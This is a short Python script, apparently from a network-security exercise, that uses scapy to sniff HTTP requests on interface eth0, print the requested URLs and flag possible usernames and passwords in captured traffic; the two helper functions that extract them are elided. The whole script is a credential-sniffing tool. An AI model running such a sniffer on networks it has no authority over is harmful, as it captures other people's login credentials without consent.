#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):...

def get_login_info(packet):...

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("[+] HTTP Request >> " +url)

        login_info= get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")